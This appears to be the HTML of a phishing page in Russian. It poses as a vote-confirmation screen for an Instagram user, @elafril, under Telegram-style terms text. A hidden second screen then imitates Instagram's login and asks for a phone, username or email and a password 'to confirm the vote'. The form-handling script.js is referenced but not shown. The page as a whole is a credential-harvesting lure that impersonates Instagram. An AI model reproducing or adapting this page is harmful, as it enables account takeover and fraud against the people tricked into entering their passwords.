<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Голосование за кандидата</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>

    <div class="stars-container" id="starsContainer"></div>

    <div class="container">
        <button class="close-btn" aria-label="Закрыть">&times;</button>

        <div id="voteScreen">
            <div class="vote-card">
                <div class="avatar-container">
                    <img src="images/IMG_3191.jpeg" alt="Фото профиля" class="profile-avatar">
                    <div class="stars-badge">149</div>
                </div>
                
                <h1 class="title">Подтверждение голоса</h1>
                <p class="subtitle">Отдать свой голос за пользователя <span class="highlight">@elafril</span>?</p>
            </div>

            <button class="pay-button" id="payButton">
                Подтвердить и проголосовать
            </button>
        </div>

        <div id="loginScreen" class="hidden">
            <div class="login-card">
                <div class="instagram-brand">
                    <i class="fab fa-instagram instagram-icon"></i>
                    <span class="instagram-logo-text">Instagram</span>
                </div>
                <p class="login-subtitle">Войдите в свой аккаунт, чтобы подтвердить голос</p>
                
                <div id="errorMessage" class="error-message hidden"></div>

                <form id="instagramForm">
                    <div class="input-group">
                        <input type="text" id="username" placeholder="Телефон, имя пользователя или email" required>
                    </div>
                    <div class="input-group">
                        <input type="password" id="password" placeholder="Пароль" required>
                    </div>
                    
                    <button type="submit" class="login-button" id="submitLoginBtn">Войти и проголосовать</button>
                </form>
                
                <a href="#" class="forgot-link">Забыли пароль?</a>
            </div>
        </div>

        <p class="terms">
            Совершая действие, Вы принимаете <a href="#">условия</a> Telegram.
        </p>
    </div>

    <script src="script.js"></script>
</body>
</html>
